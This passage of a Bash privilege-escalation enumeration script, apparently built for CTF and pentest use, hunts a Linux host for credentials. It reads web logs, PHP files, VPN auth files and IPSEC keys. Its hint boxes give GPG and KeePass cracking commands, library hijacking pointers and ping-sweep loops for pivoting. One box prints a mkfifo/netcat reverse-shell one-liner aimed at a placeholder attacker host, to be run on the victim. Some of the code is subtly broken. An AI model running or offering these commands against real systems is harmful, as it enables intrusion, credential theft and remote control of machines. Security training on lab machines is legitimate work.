    if [ -f /var/log/apache/access.log ]; 
        then
            echo -e "\n${BLUE}    ══{ Apache File permision:${XX}"
                ls -la /var/log/apache/access.log 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading apache:${XX}"
                cat /var/log/apache/access.log 2>/dev/null | grep -i "user\|pass" 2>/dev/null 
        else
            echo -e "${RED}	Apache does not exist${XX}"
    fi
    if [ -f /var/log/apache2/access.log ]; 
        then
            echo -e "\n${BLUE}    ══{ Apache2 File permision:${XX}"
                ls -la /var/log/apache2/access.log 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading apache2:${XX}"
                cat /var/log/apache2/access.log 2>/dev/null | grep -i "user\|pass" 2>/dev/null 
        else
            echo -e "${RED}	Apache2 does not exist${XX}"
    fi
    if [ -f /var/log/nginx/access.log ]; 
        then
            echo -e "\n${BLUE}    ══{ nginx File permision:${XX}"
                ls -la /var/log/nginx/access.log 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading nginx:${XX}"
                nginx= cat /var/log/nginx/access.log 2>/dev/null
        else
            echo -e "${RED}	nginx does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ /etc/exports:${XX}"
    if [ -f /etc/exports ]; 
        then
            cat /etc/exports | grep -E no_root_squash 2>/dev/null
                echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║${RED}Exploit:${XX}                                                                                                      ║"
                echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe            ║"
                echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-nfs-shares/                                ║"
                echo -e "\t║    https://www.trenchesofit.com/2021/02/15/offensive-security-proving-grounds-banzai-write-up-no-metasploit/ ║"
                echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ MySQL Version:${XX}"
    mysql --version 2>/dev/null --color=always
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Vuln versions:                                                                                                ║"
        echo -e "\t║5.7.30 MySQL Community Server (GPL)                                                                           ║"
        echo -e "\t║4.x/5.0 (Linux) - User-Defined Function Dynamic Library                                                       ║"
        echo -e "\t║    https://www.trenchesofit.com/2021/02/15/offensive-security-proving-grounds-banzai-write-up-no-metasploit/ ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Is mysql service running as root:${XX}"
    ps -aux | grep root | grep mysql --color=always 2>/dev/null 
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║${RED}If so${XX}, escalate privilege root via user defined database functions (UDFs)                                     ║"
        echo -e "\t║    hthttps://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/              ║"
        echo -e "\t║    https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf         ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ MySQL:${XX}"
    if [ -f /var/lib/mysql ]; 
        then
            ls -la /var/lib/mysql 2>/dev/null --color=always
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Log File:${XX}"
    find / -iname *log -type f 2>/dev/null | xargs ls -la | grep -v "/proc/\|/usr/"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Do the following and see if there is any password:-                                         ║"
        echo -e "\t║    grep -r passw . 2>/dev/null                                                             ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ /var/www/ files:${XX}"
    ls -la /var/www --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Any settings/files (hidden) on website? Any settings file with database information?${XX}"
echo -e "\n${BLUE}    ══{ /var/www/:${XX}"
    if [ -f /var/www/ ]; 
        then
		ls -alhR /var/www/ 2>/dev/null
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ htdocs:${XX}"
    if [ -f /srv/www/htdocs/ ]; 
        then
		ls -alhR /srv/www/htdocs/ 2>/dev/null
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ apache22/data:${XX}"
    if [ -f /usr/local/www/apache22/data/ ]; 
        then
		ls -alhR /usr/local/www/apache22/data/ 2>/dev/null
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ /opt/lampp/htdocs/:${XX}"
    if [ -f /opt/lampp/htdocs/ ]; 
        then
		ls -alhR /opt/lampp/htdocs/ 2>/dev/null
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Spool File:${XX}"
    ls -la /var/spool 2>/dev/null --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Contains data which is awaiting some kind of later processing. Data in /var/spool represents║"
        echo -e "\t║work to be done in the future (by a program, user, or administrator); often data is deleted ║"
        echo -e "\t║PS: Have a look at the mail directory.                                                      ║"
        echo -e "\t║after it has been processed. Read More:                                                     ║"
        echo -e "\t║    https://refspecs.linuxfoundation.org/FHS_3.0/fhs/ch05s14.html                           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ PostgreSQL:${XX}"
    if [ -f /var/lib/pgsql ]; 
        then
            echo -e "\n${BLUE}    ══{ Directory:${XX}"
                ls -la /var/lib/pgsql 2>/dev/null
            echo -e "\n${BLUE}    ══{ PostgreSQL Version:${XX}"
                psql -V 2>/dev/null
        else
            echo -e "${RED}	PostgreSQL does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ System files dont belong to root:${XX}"
    find /lib/systemd/ \! -uid 0 -type f 2>/dev/null | xargs -r ls -la 2>/dev/null --color=always
echo -e "\n${BLUE}╔═════{ Tools/Languages Installed:${XX}"
    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Some of the tools have an exploit, do compgen -c to list all of the tools. Exploit:         ║"
        echo -e "\t║    https://gtfobins.github.io/                                                             ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Config Files:${XX}"
    find / -iname *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
echo -e "\n${BLUE}╔═════{ Bash Files 'Excluded /usr/ | /opt/':${XX}"
    find / -iname *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
echo -e "\n${BLUE}╔═════{ Python Files 'Excluded file in /usr/ | /opt/':${XX}"
    find / -iname *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share/\|/usr/bin/\|/usr/lib/\|/usr/share/\|/usr/local/\|/var/lib/\|/opt/firmware-mod-kit/\|/opt/xplico/\|/opt/lib/|"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the file is owned by root and can be executed by the current user, try to read it, maybe ║"
        echo -e "\t║the file can be exploitd by abusing it's library                                            ║"
        echo -e "\t║    https://0xatom.github.io/tryhackme/2021/01/04/thm-wonderland/                           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Any writable Python files:${XX}"
    find /usr/lib/python* -writable 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the file is owned by root and writable to the curent user, you may hijack the file and   ║"
        echo -e "\t║& gain RCE. IF-&-ONLY-IF any python file is running by root & needs to import that library  ║"
        echo -e "\t║Ex: Hijacking library:                                                                      ║"
        echo -e "\t║    https://rastating.github.io/privilege-escalation-via-python-library-hijacking/          ║"
        echo -e "\t║    https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-friendzone/   ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ PHP Files 'Excluded /usr/ | /opt/':${XX}"
    find / -iname *.php -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
echo -e "\n${BLUE}╔═════{ Grep hardcoded passwords in *.php files:${XX}"
    find / -name "*.php" -print0 2>/dev/null | xargs -0 grep -i -n "var "$"password" --color=always
echo -e "\n${BLUE}╔═════{ Text Files:${XX}"
    find / -iname *.txt -type f 2>/dev/null | xargs ls -la 2>/dev/null | grep -v "/usr/\|/opt/\|/lib/\|/etc/"
        echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║smach2root search has excluded the following directory:-                       ║"
        echo -e "\t║  /usr/*       |  /opt/       |  /etc/                                         ║"
        echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ HTML Files 'Excluded /usr/':${XX}"
    find / -iname *.html -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/"
echo -e "\n${BLUE}╔═════{ .GPG Files:${XX}"
    find / -iname *.gpg -type f 2>/dev/null | grep -v "/usr/\|/var/"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║A GPG file is a security key used to decrypt an encrypted file generated by GNU Privacy     ║"
        echo -e "\t║Guard (GnuPG), a file encryption program. The secure format is based on the OpenPGP         ║"
        echo -e "\t║standard defined by RFC2440,the same standard Pretty Good Privacy (.PGP) files use.         ║"
        echo -e "\t║The file can be cracked by using one of the following steps:                                ║"
        echo -e "\t║  A) gpg --batch --passphrase ABCD -d file.gpg                                              ║"
        echo -e "\t║  B) gpg2john file.gpg > hash                                                               ║"
        echo -e "\t║     john hash -w=all                                                                       ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ .pyc Files:${XX}"
    find / -iname *.pyc -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/\|/var/" 
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Send the .pyc file to attacker PC and download uncompyle6 to decompile the file             ║"
        echo -e "\t║    uncompyle6 .pyc                                                                         ║"
        echo -e "\t║Try to understand how the file is writen and find out any possible way for PE               ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ KeePass database file:${XX}"
    find / -name *.kdbx -o -name *.kdb -type f 2>/dev/null 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║KeePass is a free open source password manager, which helps you to manage your passwords in ║"
        echo -e "\t║a secure way. You can store all your passwords in one database, which is locked with a      ║"
        echo -e "\t║master key. There are many exploits on the internet.                                        ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                    ║"
        echo -e "\t║    Get the file to your local PC                                                           ║"
        echo -e "\t║    keepass2john file.kdbx > hash                                                           ║"
        echo -e "\t║    john hash                                                                               ║" 
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ .ZIP Files:${XX}"
    find / -iname *.zip -type f 2>/dev/null | grep -v "/usr/"
echo -e "\n${BLUE}╔═════{ .RAR Files:${XX}"
    find / -iname *.rar -type f 2>/dev/null | grep -v "/usr/"
echo -e "\n${BLUE}╔═════{ Image Files:${XX}"
    echo -e "\n${BLUE}    ══{ TIFF:${XX}"
    find / -iname *.tif -type f 2>/dev/null | grep -v "/usr/"
    find / -iname *.tif -type f 2>/dev/null | grep -v "/usr/"
    echo -e "\n${BLUE}    ══{ Bitmap:${XX}"
    find / -iname *.bmp -type f 2>/dev/null | grep -v "/usr/"
    echo -e "\n${BLUE}    ══{ JPEG:${XX}"
    find / -iname *.jpg -type f 2>/dev/null | grep -v "/usr/"
    find / -iname *.jpeg -type f 2>/dev/null | grep -v "/usr/"
    echo -e "\n${BLUE}    ══{ GIF:${XX}"
    find / -iname *.gif -type f 2>/dev/null | grep -v "/usr/"
    echo -e "\n${BLUE}    ══{ EPS:${XX}"
    find / -iname *.eps -type f 2>/dev/null | grep -v "/usr/"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Use steganography tools and find out any hidden strings or usefull info.                    ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Print IPSEC VPN Keys (requires root):${XX}"
    ip xfrm state list
echo -e "\n${BLUE}╔═════{ OpenLDAP Configuration:${XX}"
    cat /etc/openldap/ldap.conf 2>/dev/null
echo -e "\n${BLUE}╔═════{ Current user trash files:${XX}"
    if [ -d ~/.local/share/Trash/ ]; 
        then
		    ls -la ~/.local/share/Trash/ 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Have a look at the trash files and see if you can find any useful information.              ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	Trash is Empty${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Wireshark files:${XX}"
    find / -name *.pcapng -o -name *.libpcap -type f 2>/dev/null | grep -v "/usr/"
echo -e "\n${BLUE}╔═════{ RDP Profiles:${XX}"
    find / -name *.RDP -o -name *.rdp -type f 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Decode the RDP Password using Cain & Abel. So, open Cain & Adel the go to                   ║"
        echo -e "\t║    Tools > Remote Desktop Password Decoder $ then load the RDP profile to decode.          ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Chkrootkit:${XX}"
    grep -rnw -i "ROOTDIR is" --color=always 2>/dev/null & sleep 10 ; kill $!
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the system is running chkrootkit, run nc on attacker pc and run the following command on ║"
        echo -e "\t║victim PC:-                                                                                 ║"
        echo -e "\t║echo '#!/bin/bash' > update                                                                 ║"
        echo -e "\t║echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 1234 >/tmp/f' >> update ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Modified Files Past 60 min:${XX}"
    find / -mmin -60 -xdev 2>/dev/null | grep -v '/proc/\|/sys/\|/run/\|/dev/\|/var/' | xargs ls -ld --color=always 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║It can be useful to check files that were modified recently, as they may be containing      ║"
        echo -e "\t║useful information and/or credentials.                                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Git Server Enumeration:${XX}"
    find / -type d -name git-server -print 2>/dev/null
echo -e "\n${BLUE}╔═════{ Git User:${XX}"
    cat /etc/passwd | grep git-shell 2>/dev/null
echo -e "\n${BLUE}╔═════{ OpenVPN Files:${XX}"
    find / -iname *.ovpn -type f 2>/dev/null
echo -e "\n${BLUE}    ══{ auth.txt:${XX}"
    if [ -f /etc/openvpn/auth.txt ];
        then
            cat /etc/openvpn/auth.txt 2> dev/null
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ════════════════════════════════════════[ Scanning Target Network ]═════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n${BLUE}╔═════{ Pivoting:${XX}"
    echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\t║Try to scan the host network and see if there is any other host online. However, we won't be able to access those   ║"
    echo -e "\t║machine. Therefor, we have to do tunneling from the current machine to them.                                        ║"
    echo -e "\t║Read More:                                                                                                          ║"
    echo -e "\t║  https://nullsweep.com/pivot-cheatsheet-for-pentesters/                                                            ║"
    echo -e "\t║  https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html                                                ║"
    echo -e "\t║  https://pentest.blog/explore-hidden-networks-with-double-pivoting/                                                ║"
    echo -e "\t║  https://www.offensive-security.com/metasploit-unleashed/pivoting/                                                 ║"
    echo -e "\t║  https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/         ║"
    echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Usefull tools for network scanning:${XX}"
echo -e "\n${BLUE}    ══{ Nmap:${XX}"
    if [ -f /usr/bin/nmap ];
        then
            echo "  Nmap is installed on the system, use it to scan the host network"
        else
            echo -e "  Nmap is not installed"
    fi
echo -e "\n${BLUE}    ══{ Netcat:${XX}"
    if [ -f /usr/bin/nc ];
        then
            echo "  Netcat is installed on the system, use it to scan the host network"
        else
            echo -e "  Netcat is not installed"
    fi
echo -e "\n${BLUE}    ══{ fping:${XX}"
    if [ -f /usr/bin/fping ];
        then
            echo "  fping is installed on the system, use it to scan the host network"
        else
            echo -e "  fping is not installed"
    fi
echo -e "\n${BLUE}    ══{ ping:${XX}"
    if [ -f /usr/bin/ping ];
        then
            echo "  ping is installed on the system, use it to scan the host network"
        else
            echo -e "  ping is not installed"
    fi
    echo -e "\n"
    read -p "    ══{ Do you want to scan target network using 'for loop'? [Y/N]:" input
        if [[ $input == "Y" || $input == "y" ]]; 
        then
            read -p "Enter 1st octic : " O1
            read -p "Enter 2nd octic : " O2
            read -p "Enter 3rd octic : " O3
            echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║This will scan all 255 IPs, and may take time based on the network range, please be patient. This will run normal   ║"
            echo -e "\t║for loop in our case.                                                                                               ║"
            echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            for i in {1..255}; do (ping $O1.$O2.$O3.$i -c 1 -w 5  >/dev/null && echo -e "Host $O1.$O2.$O3.$i is alive"); done
        else
            echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║Please have a look at the host network & findout if there is any device that you may pivite to. You can do it by any║"
            echo -e "\t║of the following loop commands:                                                                                     ║"
            echo -e '\t║    for ip in $(seq 1 255); do ping -c 1 A.B.C.$ip | grep "bytes from"; done                                        ║'
            echo -e '\t║    for i in {1..255}; do ping -c 1 A.B.C.$i | grep "bytes from"; done                                              ║'
            echo -e '\t║    for i in {1..255}; do (ping A.B.C.$i -c 1 -w 5  >/dev/null && echo -e "Host with IP $i Is Alive"); done         ║'
            echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        fi
echo -e "\n\n${RED}\t\tEnumeration is completed ╔═══════════════════════════════════(100%)═══════════════════════════════════╗${XX}\n\n"
